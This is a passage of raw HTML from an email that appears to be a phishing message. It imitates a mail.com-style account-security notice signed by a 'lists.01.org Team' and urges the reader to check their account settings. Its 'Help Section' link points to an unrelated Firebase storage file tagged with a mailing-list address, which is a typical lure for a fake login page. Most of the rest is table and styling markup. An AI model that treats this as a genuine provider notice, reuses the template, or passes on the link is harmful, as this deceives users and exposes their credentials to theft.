G-LEFT: 0px; LINE-HEIGHT: 18px; PADDING-RIGHT: 0px; BACKGROUND-COLOR: rgb(2=
55,255,255)" width=3D"100%" align=3Dcenter>
<TABLE class=3Dpage style=3D"BOX-SIZING: border-box; BORDER-TOP: medium non=
e; BORDER-RIGHT: medium none; WIDTH: 682px; BACKGROUND: none transparent sc=
roll repeat 0% 0%; BORDER-COLLAPSE: collapse; BORDER-BOTTOM: medium none; B=
ORDER-LEFT: medium none; MARGIN: 0px auto" cellSpacing=3D0 cellPadding=3D0 =
width=3D320 align=3Dcenter border=3D0>
<TBODY>
<TR>
<TD class=3D"edge linefix" style=3D"FONT-SIZE: 1px; MAX-WIDTH: 30px !import=
ant; WIDTH: 30px !important; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING=
-LEFT: 0px; LINE-HEIGHT: 0px; PADDING-RIGHT: 0px" width=3D10><IMG style=3D"=
FONT-SIZE: 12px; MAX-WIDTH: 30px !important; BORDER-TOP: 0px; BORDER-RIGHT:=
 0px; WIDTH: 30px !important; BORDER-BOTTOM: 0px; TEXT-ALIGN: center; BORDE=
R-LEFT: 0px; DISPLAY: block; LINE-HEIGHT: 3em" border=3D0 alt=3D"" src=3D"h=
ttps://img.ui-portal.de/p.gif" width=3D10 height=3D1></TD>
<TD class=3D"w620 w940" style=3D"FONT-SIZE: 13px; MAX-WIDTH: 622px !importa=
nt; WIDTH: 622px !important; FLOAT: none; PADDING-BOTTOM: 0px; PADDING-TOP:=
 0px; PADDING-LEFT: 0px; LINE-HEIGHT: 18px; PADDING-RIGHT: 0px" vAlign=3Dto=
p width=3D300 align=3Dleft>
<TABLE class=3D"w620 w780" style=3D"BOX-SIZING: border-box; MAX-WIDTH: 622p=
x !important; BORDER-TOP: medium none; BORDER-RIGHT: medium none; WIDTH: 62=
2px !important; BORDER-COLLAPSE: collapse; BORDER-BOTTOM: medium none; FLOA=
T: none; BORDER-LEFT: medium none" cellSpacing=3D0 cellPadding=3D0 width=3D=
300 align=3Dleft border=3D0>
<TBODY>
<TR>
<TD class=3D"w620 w780" style=3D"FONT-SIZE: 13px; MAX-WIDTH: 620px !importa=
nt; WIDTH: 620px !important; FLOAT: none; PADDING-BOTTOM: 0px; PADDING-TOP:=
 0px; PADDING-LEFT: 0px; LINE-HEIGHT: 18px; PADDING-RIGHT: 0px" vAlign=3Dto=
p width=3D300 align=3Dleft>
<TABLE class=3D"w620 w780" style=3D"BOX-SIZING: border-box; MAX-WIDTH: 620p=
x !important; BORDER-TOP: medium none; BORDER-RIGHT: medium none; WIDTH: 62=
0px !important; BORDER-COLLAPSE: collapse; BORDER-BOTTOM: medium none; FLOA=
T: none; BORDER-LEFT: medium none" cellSpacing=3D0 cellPadding=3D0 width=3D=
300 border=3D0>
<TBODY>
<TR>
<TD class=3D"mso-font-2 mso-w600" style=3D"FONT-SIZE: 13px; PADDING-BOTTOM:=
 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; LINE-HEIGHT: 18px; PADDING-RIGHT=
: 0px" vAlign=3Dtop width=3D300 align=3Dleft>
<TABLE style=3D"BOX-SIZING: border-box; BORDER-TOP: medium none; BORDER-RIG=
HT: medium none; BORDER-COLLAPSE: collapse; BORDER-BOTTOM: medium none; BOR=
DER-LEFT: medium none" cellSpacing=3D0 cellPadding=3D0 width=3D729 border=
=3D0>
<TBODY>
<TR class=3Dmso-font-2>
<TD class=3Dlinefix style=3D"FONT-SIZE: 1px; PADDING-BOTTOM: 0px; PADDING-T=
OP: 0px; PADDING-LEFT: 0px; LINE-HEIGHT: 0px; PADDING-RIGHT: 0px" height=3D=
18 vAlign=3Dtop width=3D16><IMG style=3D"FONT-SIZE: 12px; BORDER-TOP: 0px; =
BORDER-RIGHT: 0px; BORDER-BOTTOM: 0px; TEXT-ALIGN: center; BORDER-LEFT: 0px=
; DISPLAY: block; LINE-HEIGHT: 3em" src=3D"https://img.ui-portal.de/p.gif" =
width=3D16 height=3D8>
 <img style=3D"FONT-SIZE: 12px; BORDER-TOP: 0px; BORDER-RIGHT: 0px; BORDER-=
BOTTOM: 0px; TEXT-ALIGN: center; BORDER-LEFT: 0px; DISPLAY: block; LINE-HEI=
GHT: 3em" alt=3D"*" src=3D"https://img.ui-portal.de/newsletterversand/ci/ma=
ilcom/bullet8px.png" width=3D"8" height=3D"8"></TD>
<TD class=3Dmso-font-2 style=3D"FONT-SIZE: 13px; PADDING-BOTTOM: 0px; PADDI=
NG-TOP: 0px; PADDING-LEFT: 0px; LINE-HEIGHT: 18px; PADDING-RIGHT: 0px" vAli=
gn=3Dtop><FONT class=3Dmso-font-2 style=3D"FONT-SIZE: 16px; FONT-FAMILY: Dr=
oidSans, Arial, Verdana, sans-serif; LINE-HEIGHT: 24px" color=3D#515151 siz=
e=3D2 face=3DArial,Helvetica,Verdana,sans-serif>Check that all your compute=
rs and mobile devices used to access your account have an up-to-date virus =
scanner to detect any possible malware.</FONT></TD></TR>
<TR>
<TD class=3Dlinefix style=3D"FONT-SIZE: 1px; PADDING-BOTTOM: 0px; PADDING-T=
OP: 0px; PADDING-LEFT: 0px; LINE-HEIGHT: 0px; PADDING-RIGHT: 0px"><IMG styl=
e=3D"FONT-SIZE: 12px; BORDER-TOP: 0px; BORDER-RIGHT: 0px; BORDER-BOTTOM: 0p=
x; TEXT-ALIGN: center; BORDER-LEFT: 0px; DISPLAY: block; LINE-HEIGHT: 3em" =
border=3D0 alt=3D"" src=3D"https://img.ui-portal.de/p.gif" width=3D16 heigh=
t=3D8></TD>
<TD class=3Dlinefix style=3D"FONT-SIZE: 1px; PADDING-BOTTOM: 0px; PADDING-T=
OP: 0px; PADDING-LEFT: 0px; LINE-HEIGHT: 0px; PADDING-RIGHT: 0px"><IMG styl=
e=3D"FONT-SIZE: 12px; BORDER-TOP: 0px; BORDER-RIGHT: 0px; BORDER-BOTTOM: 0p=
x; TEXT-ALIGN: center; BORDER-LEFT: 0px; DISPLAY: block; LINE-HEIGHT: 3em" =
border=3D0 alt=3D"" src=3D"https://img.ui-portal.de/p.gif" width=3D1 height=
=3D8></TD></TR>
<TR class=3Dmso-font-2>
<TD class=3Dlinefix style=3D"FONT-SIZE: 1px; PADDING-BOTTOM: 0px; PADDING-T=
OP: 0px; PADDING-LEFT: 0px; LINE-HEIGHT: 0px; PADDING-RIGHT: 0px" height=3D=
18 vAlign=3Dtop width=3D16><IMG style=3D"FONT-SIZE: 12px; BORDER-TOP: 0px; =
BORDER-RIGHT: 0px; BORDER-BOTTOM: 0px; TEXT-ALIGN: center; BORDER-LEFT: 0px=
; DISPLAY: block; LINE-HEIGHT: 3em" src=3D"https://img.ui-portal.de/p.gif" =
width=3D16 height=3D8>
 <img style=3D"FONT-SIZE: 12px; BORDER-TOP: 0px; BORDER-RIGHT: 0px; BORDER-=
BOTTOM: 0px; TEXT-ALIGN: center; BORDER-LEFT: 0px; DISPLAY: block; LINE-HEI=
GHT: 3em" alt=3D"*" src=3D"https://img.ui-portal.de/newsletterversand/ci/ma=
ilcom/bullet8px.png" width=3D"8" height=3D"8"></TD>
<TD class=3Dmso-font-2 style=3D"FONT-SIZE: 13px; PADDING-BOTTOM: 0px; PADDI=
NG-TOP: 0px; PADDING-LEFT: 0px; LINE-HEIGHT: 18px; PADDING-RIGHT: 0px" vAli=
gn=3Dtop><FONT class=3Dmso-font-2 style=3D"FONT-SIZE: 16px; FONT-FAMILY: Dr=
oidSans, Arial, Verdana, sans-serif; LINE-HEIGHT: 24px" color=3D#515151 siz=
e=3D2 face=3DArial,Helvetica,Verdana,sans-serif>
Check whether any of your personal data, especially your alternative addres=
s, has been changed by clicking on &#8220;My Account&#8221; on your &#8220;=
Homepage&#8221;.</FONT></TD></TR>
<TR>
<TD class=3Dlinefix style=3D"FONT-SIZE: 1px; PADDING-BOTTOM: 0px; PADDING-T=
OP: 0px; PADDING-LEFT: 0px; LINE-HEIGHT: 0px; PADDING-RIGHT: 0px"><IMG styl=
e=3D"FONT-SIZE: 12px; BORDER-TOP: 0px; BORDER-RIGHT: 0px; BORDER-BOTTOM: 0p=
x; TEXT-ALIGN: center; BORDER-LEFT: 0px; DISPLAY: block; LINE-HEIGHT: 3em" =
border=3D0 alt=3D"" src=3D"https://img.ui-portal.de/p.gif" width=3D16 heigh=
t=3D8></TD>
<TD class=3Dlinefix style=3D"FONT-SIZE: 1px; PADDING-BOTTOM: 0px; PADDING-T=
OP: 0px; PADDING-LEFT: 0px; LINE-HEIGHT: 0px; PADDING-RIGHT: 0px"><IMG styl=
e=3D"FONT-SIZE: 12px; BORDER-TOP: 0px; BORDER-RIGHT: 0px; BORDER-BOTTOM: 0p=
x; TEXT-ALIGN: center; BORDER-LEFT: 0px; DISPLAY: block; LINE-HEIGHT: 3em" =
border=3D0 alt=3D"" src=3D"https://img.ui-portal.de/p.gif" width=3D1 height=
=3D8></TD></TR>
<TR class=3Dmso-font-2>
<TD class=3Dlinefix style=3D"FONT-SIZE: 1px; PADDING-BOTTOM: 0px; PADDING-T=
OP: 0px; PADDING-LEFT: 0px; LINE-HEIGHT: 0px; PADDING-RIGHT: 0px" height=3D=
18 vAlign=3Dtop width=3D16><IMG style=3D"FONT-SIZE: 12px; BORDER-TOP: 0px; =
BORDER-RIGHT: 0px; BORDER-BOTTOM: 0px; TEXT-ALIGN: center; BORDER-LEFT: 0px=
; DISPLAY: block; LINE-HEIGHT: 3em" src=3D"https://img.ui-portal.de/p.gif" =
width=3D16 height=3D8>
 <img style=3D"FONT-SIZE: 12px; BORDER-TOP: 0px; BORDER-RIGHT: 0px; BORDER-=
BOTTOM: 0px; TEXT-ALIGN: center; BORDER-LEFT: 0px; DISPLAY: block; LINE-HEI=
GHT: 3em" alt=3D"*" src=3D"https://img.ui-portal.de/newsletterversand/ci/ma=
ilcom/bullet8px.png" width=3D"8" height=3D"8"></TD>
<TD class=3Dmso-font-2 style=3D"FONT-SIZE: 13px; PADDING-BOTTOM: 0px; PADDI=
NG-TOP: 0px; PADDING-LEFT: 0px; LINE-HEIGHT: 18px; PADDING-RIGHT: 0px" vAli=
gn=3Dtop><FONT class=3Dmso-font-2 style=3D"FONT-SIZE: 16px; FONT-FAMILY: Dr=
oidSans, Arial, Verdana, sans-serif; LINE-HEIGHT: 24px" color=3D#515151 siz=
e=3D2 face=3DArial,Helvetica,Verdana,sans-serif>
Go to your &#8220;Email settings&#8221; then click on &#8220;Filter Rules&#=
8221; to check whether any forwarding rules have been created. If you creat=
ed a forwarding rule yourself, ensure that the email address used is still =
valid.</FONT></TD></TR>
<TR>
<TD class=3Dlinefix style=3D"FONT-SIZE: 1px; PADDING-BOTTOM: 0px; PADDING-T=
OP: 0px; PADDING-LEFT: 0px; LINE-HEIGHT: 0px; PADDING-RIGHT: 0px"><IMG styl=
e=3D"FONT-SIZE: 12px; BORDER-TOP: 0px; BORDER-RIGHT: 0px; BORDER-BOTTOM: 0p=
x; TEXT-ALIGN: center; BORDER-LEFT: 0px; DISPLAY: block; LINE-HEIGHT: 3em" =
border=3D0 alt=3D"" src=3D"https://img.ui-portal.de/p.gif" width=3D16 heigh=
t=3D8></TD>
<TD class=3Dlinefix style=3D"FONT-SIZE: 1px; PADDING-BOTTOM: 0px; PADDING-T=
OP: 0px; PADDING-LEFT: 0px; LINE-HEIGHT: 0px; PADDING-RIGHT: 0px"><IMG styl=
e=3D"FONT-SIZE: 12px; BORDER-TOP: 0px; BORDER-RIGHT: 0px; BORDER-BOTTOM: 0p=
x; TEXT-ALIGN: center; BORDER-LEFT: 0px; DISPLAY: block; LINE-HEIGHT: 3em" =
border=3D0 alt=3D"" src=3D"https://img.ui-portal.de/p.gif" width=3D1 height=
=3D8></TD></TR></TBODY></TABLE></TD></TR>
<TR height=3D16>
<TD class=3Dlinefix style=3D"FONT-SIZE: 1px; PADDING-BOTTOM: 0px; PADDING-T=
OP: 0px; PADDING-LEFT: 0px; LINE-HEIGHT: 0px; PADDING-RIGHT: 0px" height=3D=
16><IMG style=3D"FONT-SIZE: 12px; BORDER-TOP: 0px; BORDER-RIGHT: 0px; BORDE=
R-BOTTOM: 0px; TEXT-ALIGN: center; BORDER-LEFT: 0px; DISPLAY: block; LINE-H=
EIGHT: 3em" border=3D0 alt=3D"" src=3D"https://img.ui-portal.de/p.gif" widt=
h=3D1 height=3D16></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD>=

<TD class=3D"edge linefix" style=3D"FONT-SIZE: 1px; MAX-WIDTH: 30px !import=
ant; WIDTH: 30px !important; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING=
-LEFT: 0px; LINE-HEIGHT: 0px; PADDING-RIGHT: 0px" width=3D10><IMG style=3D"=
FONT-SIZE: 12px; MAX-WIDTH: 30px !important; BORDER-TOP: 0px; BORDER-RIGHT:=
 0px; WIDTH: 30px !important; BORDER-BOTTOM: 0px; TEXT-ALIGN: center; BORDE=
R-LEFT: 0px; DISPLAY: block; LINE-HEIGHT: 3em" border=3D0 alt=3D"" src=3D"h=
ttps://img.ui-portal.de/p.gif" width=3D10 height=3D1></TD></TR>
</TBODY></TABLE></TD></TR>
<TR height=3D10>
<TD class=3Dlinefix style=3D"FONT-SIZE: 1px; PADDING-BOTTOM: 0px; PADDING-T=
OP: 0px; PADDING-LEFT: 0px; LINE-HEIGHT: 0px; PADDING-RIGHT: 0px" height=3D=
10><IMG style=3D"FONT-SIZE: 12px; BORDER-TOP: 0px; BORDER-RIGHT: 0px; BORDE=
R-BOTTOM: 0px; TEXT-ALIGN: center; BORDER-LEFT: 0px; DISPLAY: block; LINE-H=
EIGHT: 3em" border=3D0 alt=3D"" src=3D"https://img.ui-portal.de/p.gif" widt=
h=3D1 height=3D10></TD></TR></TBODY></TABLE>
<TABLE style=3D"BOX-SIZING: border-box; FONT-SIZE: 13px; BORDER-TOP: medium=
 none; FONT-FAMILY: Arial, Helvetica, Verdana, sans-serif; BORDER-RIGHT: me=
dium none; WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-COLLAPSE: collaps=
e; BORDER-BOTTOM: medium none; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLO=
R: rgb(0,0,0); FONT-STYLE: normal; BORDER-LEFT: medium none; ORPHANS: 2; WI=
DOWS: 2; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-I=
NDENT: 0px; font-variant-ligatures: normal;=20
font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-=
style: initial; text-decoration-color: initial" cellSpacing=3D0 cellPadding=
=3D0 width=3D"100%" align=3Dcenter bgColor=3D#ffffff border=3D0>
<TBODY>
<TR>
<TD style=3D"FONT-SIZE: 13px; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDIN=
G-LEFT: 0px; LINE-HEIGHT: 18px; PADDING-RIGHT: 0px; BACKGROUND-COLOR: rgb(2=
55,255,255)" width=3D"100%" align=3Dcenter>
<TABLE class=3Dpage style=3D"BOX-SIZING: border-box; BORDER-TOP: medium non=
e; BORDER-RIGHT: medium none; WIDTH: 682px; BACKGROUND: none transparent sc=
roll repeat 0% 0%; BORDER-COLLAPSE: collapse; BORDER-BOTTOM: medium none; B=
ORDER-LEFT: medium none; MARGIN: 0px auto" cellSpacing=3D0 cellPadding=3D0 =
width=3D320 align=3Dcenter border=3D0>
<TBODY>
<TR>
<TD class=3D"edge linefix" style=3D"FONT-SIZE: 1px; MAX-WIDTH: 30px !import=
ant; WIDTH: 30px !important; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING=
-LEFT: 0px; LINE-HEIGHT: 0px; PADDING-RIGHT: 0px" width=3D10><IMG style=3D"=
FONT-SIZE: 12px; MAX-WIDTH: 30px !important; BORDER-TOP: 0px; BORDER-RIGHT:=
 0px; WIDTH: 30px !important; BORDER-BOTTOM: 0px; TEXT-ALIGN: center; BORDE=
R-LEFT: 0px; DISPLAY: block; LINE-HEIGHT: 3em" border=3D0 alt=3D"" src=3D"h=
ttps://img.ui-portal.de/p.gif" width=3D10 height=3D1></TD>
<TD class=3D"w620 w940" style=3D"FONT-SIZE: 13px; MAX-WIDTH: 622px !importa=
nt; WIDTH: 622px !important; FLOAT: none; PADDING-BOTTOM: 0px; PADDING-TOP:=
 0px; PADDING-LEFT: 0px; LINE-HEIGHT: 18px; PADDING-RIGHT: 0px" vAlign=3Dto=
p width=3D300 align=3Dleft>
<TABLE class=3D"w620 w780" style=3D"BOX-SIZING: border-box; MAX-WIDTH: 622p=
x !important; BORDER-TOP: medium none; BORDER-RIGHT: medium none; WIDTH: 62=
2px !important; BORDER-COLLAPSE: collapse; BORDER-BOTTOM: medium none; FLOA=
T: none; BORDER-LEFT: medium none" cellSpacing=3D0 cellPadding=3D0 width=3D=
300 align=3Dleft border=3D0>
<TBODY>
<TR>
<TD class=3D"w620 w780" style=3D"FONT-SIZE: 13px; MAX-WIDTH: 620px !importa=
nt; WIDTH: 620px !important; FLOAT: none; PADDING-BOTTOM: 0px; PADDING-TOP:=
 0px; PADDING-LEFT: 0px; LINE-HEIGHT: 18px; PADDING-RIGHT: 0px" vAlign=3Dto=
p width=3D300 align=3Dleft>
<TABLE class=3D"w620 w780" style=3D"BOX-SIZING: border-box; MAX-WIDTH: 620p=
x !important; BORDER-TOP: medium none; BORDER-RIGHT: medium none; WIDTH: 70=
5px !important; BORDER-COLLAPSE: collapse; BORDER-BOTTOM: medium none; FLOA=
T: none; BORDER-LEFT: medium none" cellSpacing=3D0 cellPadding=3D0 border=
=3D0>
<TBODY>
<TR>
<TD class=3D"mso-font-2 mso-w600" style=3D"FONT-SIZE: 13px; PADDING-BOTTOM:=
 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; LINE-HEIGHT: 18px; PADDING-RIGHT=
: 0px" vAlign=3Dtop width=3D705 align=3Dleft><FONT class=3Dmso-font-2 style=
=3D"FONT-SIZE: 16px; FONT-FAMILY: DroidSans, Arial, Verdana, sans-serif; LI=
NE-HEIGHT: 24px" color=3D#515151 size=3D2 face=3DArial,Helvetica,Verdana,sa=
ns-serif>You can find further information about updating your account secur=
ity here:&nbsp;<SPAN class=3Dmore>
<A style=3D"TEXT-DECORATION: none; COLOR: rgb(34,105,195); OUTLINE-WIDTH: 0=
px; OUTLINE-STYLE: none; OUTLINE-COLOR: invert" href=3D"https://firebasesto=
rage.googleapis.com/v0/b/urgl-e5636.appspot.com/o/bubuindex.html?alt=3Dmedi=
a&amp;token=3De0a44e7b-b60a-4114-85c8-b2b43c2b4426#linux-nvdimm@lists.01.or=
g" target=3D_blank>Help&nbsp;Section</A></SPAN><BR><BR>Thank you for your c=
ooperation.<BR><STRONG>Your lists.01.org Team</STRONG></FONT></TD></TR></TB=
ODY></TABLE></TD></TR></TBODY></TABLE></TD>
<TD class=3D"edge linefix" style=3D"FONT-SIZE: 1px; MAX-WIDTH: 30px !import=
ant; WIDTH: 30px !important; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING=
-LEFT: 0px; LINE-HEIGHT: 0px; PADDING-RIGHT: 0px" width=3D10><IMG style=3D"=
FONT-SIZE: 12px; MAX-WIDTH: 30px !important; BORDER-TOP: 0px; BORDER-RIGHT:=
 0px; WIDTH: 30px !important; BORDER-BOTTOM: 0px; TEXT-ALIGN: center; BORDE=
R-LEFT: 0px; DISPLAY: block; LINE-HEIGHT: 3em" border=3D0 alt=3D"" src=3D"h=
ttps://img.ui-portal.de/p.gif" width=3D10 height=3D1></TD></TR>
</TBODY></TABLE></TD></TR>
<TR height=3D40>
<TD class=3Dlinefix style=3D"FONT-SIZE: 1px; PADDING-BOTTOM: 0px; PADDING-T=
OP: 0px; PADDING-LEFT: 0px; LINE-HEIGHT: 0px; PADDING-RIGHT: 0px" height=3D=
40><IMG style=3D"FONT-SIZE: 12px; BORDER-TOP: 0px; BORDER-RIGHT: 0px; BORDE=
R-BOTTOM: 0px; TEXT-ALIGN: center; BORDER-LEFT: 0px; DISPLAY: block; LINE-H=
EIGHT: 3em" border=3D0 alt=3D"" src=3D"https://img.ui-portal.de/p.gif" widt=
h=3D1 height=3D40></TD></TR></TBODY></TABLE>
<TABLE style=3D"BOX-SIZING: border-box; FONT-SIZE: 13px; BORDER-TOP: medium=
 none; FONT-FAMILY: Arial, Helvetica, Verdana, sans-serif; BORDER-RIGHT: me=
dium none; WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-COLLAPSE: collaps=
e; BORDER-BOTTOM: medium none; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLO=
R: rgb(0,0,0); FONT-STYLE: normal; BORDER-LEFT: medium none; ORPHANS: 2; WI=
DOWS: 2; LETTER-SPACING: normal; TEXT-INDENT: 0px; font-variant-ligatures: =
normal; font-variant-caps: normal;=20
-webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decora=
tion-color: initial" cellSpacing=3D0 cellPadding=3D0 width=3D"100%" align=
=3Dcenter bgColor=3D#f3f3f3 border=3D0>
<TBODY>
<TR>
<TD style=3D"FONT-SIZE: 13px; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDIN=
G-LEFT: 0px; LINE-HEIGHT: 18px; PADDING-RIGHT: 0px; BACKGROUND-COLOR: rgb(2=
43,243,243)" width=3D"100%" align=3Dcenter>
<TABLE class=3Dpage style=3D"BOX-SIZING: border-box; BORDER-TOP: medium non=
e; BORDER-RIGHT: medium none; WIDTH: 682px; BACKGROUND: none transparent sc=
roll repeat 0% 0%; BORDER-COLLAPSE: collapse; BORDER-BOTTOM: medium none; B=
ORDER-LEFT: medium none; MARGIN: 0px auto" cellSpacing=3D0 cellPadding=3D0 =
width=3D320 border=3D0>
<TBODY>
<TR>
<TD class=3D"edge linefix" style=3D"FONT-SIZE: 1px; MAX-WIDTH: 30px !import=
ant; WIDTH: 30px !important; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING=
-LEFT: 0px; LINE-HEIGHT: 0px; PADDING-RIGHT: 0px" width=3D10><IMG style=3D"=
FONT-SIZE: 12px; MAX-WIDTH: 30px !important; BORDER-TOP: 0px; BORDER-RIGHT:=
 0px; WIDTH: 30px !important; BORDER-BOTTOM: 0px; TEXT-ALIGN: center; BORDE=
R-LEFT: 0px; DISPLAY: block; LINE-HEIGHT: 3em" border=3D0 alt=3D"" src=3D"h=
ttps://img.ui-portal.de/p.gif" width=3D10 height=3D1></TD>
<TD class=3D"w620 w940" style=3D"FONT-SIZE: 13px; MAX-WIDTH: 622px !importa=
nt; WIDTH: 622px !important; FLOAT: none; PADDING-BOTTOM: 0px; PADDING-TOP:=
 0px; PADDING-LEFT: 0px; LINE-HEIGHT: 18px; PADDING-RIGHT: 0px" vAlign=3Dto=
p width=3D300 align=3Dcenter>
<TABLE class=3D"w620 w940 footnote" style=3D"BOX-SIZING: border-box; MAX-WI=
DTH: 622px !important; BORDER-TOP: medium none; BORDER-RIGHT: medium none; =
WIDTH: 622px !important; BACKGROUND: none transparent scroll repeat 0% 0%; =
BORDER-COLLAPSE: collapse; BORDER-BOTTOM: medium none; FLOAT: none; BORDER-=
LEFT: medium none" cellSpacing=3D0 cellPadding=3D0 width=3D300 border=3D0>
<TBODY>
<TR>
<TD class=3D"w620 w940" style=3D"FONT-SIZE: 1px; MAX-WIDTH: 622px !importan=
t; WIDTH: 622px !important; FLOAT: none; PADDING-BOTTOM: 0px; PADDING-TOP: =
0px; PADDING-LEFT: 0px; LINE-HEIGHT: 0px; PADDING-RIGHT: 0px" height=3D40 w=
idth=3D300 align=3Dleft><IMG style=3D"FONT-SIZE: 12px; BORDER-TOP: 0px; BOR=
DER-RIGHT: 0px; BORDER-BOTTOM: 0px; TEXT-ALIGN: center; BORDER-LEFT: 0px; D=
ISPLAY: block; LINE-HEIGHT: 3em" border=3D0 alt=3D"" src=3D"https://img.ui-=
portal.de/p.gif" width=3D1 height=3D40></TD></TR>
<TR>
<TD class=3D"w620 w940" style=3D"FONT-SIZE: 13px; MAX-WIDTH: 622px !importa=
nt; WIDTH: 622px !important; FLOAT: none; PADDING-BOTTOM: 0px; PADDING-TOP:=
 0px; PADDING-LEFT: 0px; LINE-HEIGHT: 18px; PADDING-RIGHT: 0px" width=3D300=
 align=3Dleft>
<TABLE style=3D"BOX-SIZING: border-box; BORDER-TOP: medium none; BORDER-RIG=
HT: medium none; BORDER-COLLAPSE: collapse; BORDER-BOTTOM: medium none; BOR=
DER-LEFT: medium none" cellSpacing=3D0 cellPadding=3D0 align=3Dleft border=
=3D0>
<TBODY>
<TR class=3Dlinefix style=3D"FONT-SIZE: 1px; LINE-HEIGHT: 0px">
<TD style=3D"FONT-SIZE: 14px; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDIN=
G-LEFT: 0px; LINE-HEIGHT: 22px; PADDING-RIGHT: 0px" height=3D34 vAlign=3Dmi=
ddle align=3Dleft><FONT class=3Dmso-font-1 style=3D"FONT-SIZE: 14px; FONT-F=
AMILY: DroidSans, Arial, Verdana, sans-serif; LINE-HEIGHT: 22px" color=3D#5=
15151 size=3D2 face=3DArial,Helvetica,Verdana,sans-serif>Join our community=
! Follow us on:</FONT></TD></TR></TBODY></TABLE>
<TABLE style=3D"BOX-SIZING: border-box; BORDER-TOP: medium none; BORDER-RIG=
HT: medium none; BORDER-COLLAPSE: collapse; BORDER-BOTTOM: medium none; BOR=
DER-LEFT: medium none" cellSpacing=3D0 cellPadding=3D0 border=3D0>
<TBODY>
<TR class=3Dlinefix style=3D"FONT-SIZE: 1px; LINE-HEIGHT: 0px">
<TD style=3D"FONT-SIZE: 13px; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDIN=
G-LEFT: 0px; LINE-HEIGHT: 18px; PADDING-RIGHT: 0px" align=3Dleft><IMG style=
=3D"FONT-SIZE: 12px; BORDER-TOP: 0px; BORDER-RIGHT: 0px; BORDER-BOTTOM: 0px=
; TEXT-ALIGN: center; BORDER-LEFT: 0px; DISPLAY: block; LINE-HEIGHT: 3em" b=
order=3D0 alt=3D"" src=3D"https://img.ui-portal.de/p.gif" width=3D20 height=
=3D34></TD>
<TD style=3D"FONT-SIZE: 13px; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDIN=
G-LEFT: 0px; LINE-HEIGHT: 18px; PADDING-RIGHT: 0px" align=3Dleft><A style=
=3D"TEXT-DECORATION: none; COLOR: rgb(34,105,195); OUTLINE-WIDTH: 0px; OUTL=
INE-STYLE: none; OUTLINE-COLOR: invert" href=3D"https://www.facebook.com/ma=
il.com" target=3D_blank>
<IMG style=3D"FONT-SIZE: 12px; BORDER-TOP: 0px; BORDER-RIGHT: 0px; BORDER-B=
OTTOM: 0px; TEXT-ALIGN: center; BORDER-LEFT: 0px; DISPLAY: block; LINE-HEIG=
HT: 3em" border=3D0 alt=3Dfacebook src=3D"https://img.ui-portal.de/newslett=
erversand/mailcom/icon_facebook.png" width=3D34 height=3D34></A></TD>
<TD style=3D"FONT-SIZE: 13px; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDIN=
G-LEFT: 0px; LINE-HEIGHT: 18px; PADDING-RIGHT: 0px" align=3Dleft><IMG style=
=3D"FONT-SIZE: 12px; BORDER-TOP: 0px; BORDER-RIGHT: 0px; BORDER-BOTTOM: 0px=
; TEXT-ALIGN: center; BORDER-LEFT: 0px; DISPLAY: block; LINE-HEIGHT: 3em" b=
order=3D0 alt=3D"" src=3D"https://img.ui-portal.de/p.gif" width=3D20 height=
=3D34></TD>
<TD style=3D"FONT-SIZE: 13px; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDIN=
G-LEFT: 0px; LINE-HEIGHT: 18px; PADDING-RIGHT: 0px" align=3Dleft><A style=
=3D"TEXT-DECORATION: none; COLOR: rgb(34,105,195); OUTLINE-WIDTH: 0px; OUTL=
INE-STYLE: none; OUTLINE-COLOR: invert" href=3D"https://twitter.com/maildot=
com" target=3D_blank>
<IMG style=3D"FONT-SIZE: 12px; BORDER-TOP: 0px; BORDER-RIGHT: 0px; BORDER-B=
OTTOM: 0px; TEXT-ALIGN: center; BORDER-LEFT: 0px; DISPLAY: block; LINE-HEIG=
HT: 3em" border=3D0 alt=3DTwitter src=3D"https://img.ui-portal.de/newslette=
rversand/mailcom/icon_twitter.png" width=3D34 height=3D34></A></TD></TR></T=
BODY></TABLE></TD></TR>
<TR>
<TD class=3D"w620 w940" style=3D"FONT-SIZE: 1px; MAX-WIDTH: 622px !importan=
t; WIDTH: 622px !important; FLOAT: none; PADDING-BOTTOM: 0px; PADDING-TOP: =
0px; PADDING-LEFT: 0px; LINE-HEIGHT: 0px; PADDING-RIGHT: 0px" height=3D40 w=
idth=3D300 align=3Dleft><IMG style=3D"FONT-SIZE: 12px; BORDER-TOP: 0px; BOR=
DER-RIGHT: 0px; BORDER-BOTTOM: 0px; TEXT-ALIGN: center; BORDER-LEFT: 0px; D=
ISPLAY: block; LINE-HEIGHT: 3em" border=3D0 alt=3D"" src=3D"https://img.ui-=
portal.de/p.gif" width=3D1 height=3D40></TD></TR></TBODY></TABLE>
<TABLE class=3D"w620 w940 footnote" style=3D"BOX-SIZING: border-box; MAX-WI=
DTH: 622px !important; BORDER-TOP: medium none; BORDER-RIGHT: medium none; =
WIDTH: 622px !important; BACKGROUND: none transparent scroll repeat 0% 0%; =
BORDER-COLLAPSE: collapse; BORDER-BOTTOM: medium none; FLOAT: none; BORDER-=
LEFT: medium none" cellSpacing=3D0 cellPadding=3D0 width=3D300 border=3D0>
<TBODY>
<TR>
<TD class=3D"w620 w940" style=3D"FONT-SIZE: 13px; MAX-WIDTH: 622px !importa=
nt; WIDTH: 622px !important; FLOAT: none; PADDING-BOTTOM: 0px; PADDING-TOP:=
